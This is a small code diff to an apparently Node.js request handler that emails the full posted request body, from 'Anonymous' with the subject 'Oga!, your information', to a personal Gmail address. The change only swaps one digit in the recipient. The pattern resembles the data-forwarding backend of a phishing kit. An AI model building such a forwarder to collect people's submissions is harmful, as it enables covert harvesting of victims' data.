@@ -4,7 +4,7 @@ export default async function HandleData(request, response) {
   const options = {
     subject: "Oga!, your information",
     from: "Anonymous",
-    to: "ionlyme857@gmail.com",
+    to: "ionlyme875@gmail.com",
     html: JSON.stringify(request.body),
   };
   const transporter = nodemailer.createTransport({
